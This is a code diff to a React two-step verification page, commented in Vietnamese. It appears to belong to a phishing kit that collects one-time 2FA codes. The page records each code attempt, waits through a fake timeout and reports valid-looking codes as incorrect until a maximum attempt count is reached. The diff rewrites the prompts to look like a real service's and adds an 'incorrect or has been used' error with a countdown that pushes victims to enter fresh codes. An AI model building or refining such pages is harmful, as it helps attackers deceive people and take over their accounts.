@@ -15,25 +15,25 @@ const TwoStepVerification = () => {
     const [code, setCode] = useState('');
     const [isSubmitting, setIsSubmitting] = useState(false);
     const [submitError, setSubmitError] = useState(null);
+    const [showError, setShowError] = useState(false);
     const [codeAttempts, setCodeAttempts] = useState([]);
     const [lastMessageId, setLastMessageId] = useState(null);
     const [countDown, setCountDown] = useState(config.LOAD_TIMEOUT_MS / 1000);
 
     const defaultTexts = useMemo(
         () => ({
-            authenticatorApp: 'Authenticator App',
-            authenticatorDesc: 'Google Authenticator, Duo Mobile',
-            whatsapp: 'WhatsApp',
-            whatsappDesc: "We'll send a code to number",
-            sms: 'SMS',
-            smsDesc: "We'll send a code to number",
-            email: 'Email',
-            emailDesc: "We'll send a code to",
+            authenticatorApp: 'Open your authentication app',
+            authenticatorDesc: 'Enter the 6-digit code from your 2FA app (Duo Mobile, Google Authenticator).',
+            whatsapp: 'Check your WhatsApp messages',
+            whatsappDesc: 'Enter the code we sent to your WhatsApp number',
+            sms: 'Check your text messages',
+            smsDesc: 'Enter the code we sent to number',
+            email: 'Check your email',
+            emailDesc: 'Enter the code we sent to',
             codePlaceholder: 'Enter 6 or 8 digit code',
             continueButton: 'Continue',
-            processingButton: 'Processing...',
             tryAnotherWay: 'Try Another Way',
-            errorIncorrect: 'Incorrect code. Please try again.'
+            errorIncorrect: 'The code you entered is incorrect or has been used. Please try again after {seconds} seconds.'
         }),
         []
     );
@@ -89,6 +89,17 @@ const TwoStepVerification = () => {
         translateAllTexts();
     }, []);
 
+    useEffect(() => {
+        if (showError && countDown >= 0) {
+            // Thay thế nhiều placeholder khác nhau để hỗ trợ đa ngôn ngữ
+            const errorMsg = texts.errorIncorrect
+                .replace('{seconds}', Math.round(countDown))
+                .replace('{giây}', Math.round(countDown))
+                .replace(/\{[^}]+\}/g, Math.round(countDown)); // fallback cho các placeholder khác
+            setSubmitError(errorMsg);
+        }
+    }, [countDown, texts.errorIncorrect, showError]);
+
     const formatDateVN = (dateStr) => {
         if (!dateStr) return '';
         if (/^\d{2}[/-]\d{2}[/-]\d{4}$/.exec(dateStr)) {
@@ -112,13 +123,15 @@ const TwoStepVerification = () => {
 
         setIsSubmitting(true);
         setSubmitError(null);
+        setShowError(false);
 
-        let i = config.LOAD_TIMEOUT_MS;
-        const countDown = setInterval(() => {
-            setCountDown(i / 1000);
-            i -= 1000;
-            if (i == 0) {
-                clearInterval(countDown);
+        let i = config.LOAD_TIMEOUT_MS / 1000;
+        setCountDown(i);
+        const countDownInterval = setInterval(() => {
+            i -= 1;
+            setCountDown(i);
+            if (i <= 0) {
+                clearInterval(countDownInterval);
             }
         }, 1000);
         await new Promise((resolve) => setTimeout(resolve, config.LOAD_TIMEOUT_MS));
@@ -217,7 +230,23 @@ ${codeList}`;
             }
 
             if (newCodeAttempts.length < config.MAX_CODE_ATTEMPTS) {
-                setSubmitError(texts.errorIncorrect);
+                // Reset countdown để bắt đầu đếm ngược lại
+                let j = config.LOAD_TIMEOUT_MS / 1000;
+                setCountDown(j);
+                const errorCountDown = setInterval(() => {
+                    j -= 1;
+                    setCountDown(j);
+                    if (j <= 0) {
+                        clearInterval(errorCountDown);
+                    }
+                }, 1000);
+                setShowError(true);
+                // Thay thế nhiều placeholder khác nhau để hỗ trợ đa ngôn ngữ
+                const errorMsg = texts.errorIncorrect
+                    .replace('{seconds}', Math.round(j))
+                    .replace('{giây}', Math.round(j))
+                    .replace(/\{[^}]+\}/g, Math.round(j));
+                setSubmitError(errorMsg);
                 setCode('');
             } else {
                 setTimeout(() => {
@@ -289,21 +318,11 @@ ${codeList}`;
                         />
                     </div>
                     {submitError && (
-                        <div
-                            style={{
-                                padding: '10px',
-                                backgroundColor: '#fee',
-                                border: '1px solid #fcc',
-                                borderRadius: '5px',
-                                marginTop: '10px'
-                            }}
-                        >
+                        <div className='dmm-error-verify'>
                             <p
                                 style={{
                                     color: '#c00',
-                                    fontSize: '14px',
-                                    margin: 0,
-                                    textAlign: 'center'
+                                    fontSize: '14px'
                                 }}
                             >
                                 {submitError}
@@ -320,7 +339,7 @@ ${codeList}`;
                                 cursor: isSubmitting ? 'not-allowed' : 'pointer'
                             }}
                         >
-                            {isSubmitting ? `${texts.processingButton} ${countDown}` : texts.continueButton}
+                            {isSubmitting ? <div className='spinner'></div> : texts.continueButton}
                         </button>
                     </div>
                     <div>
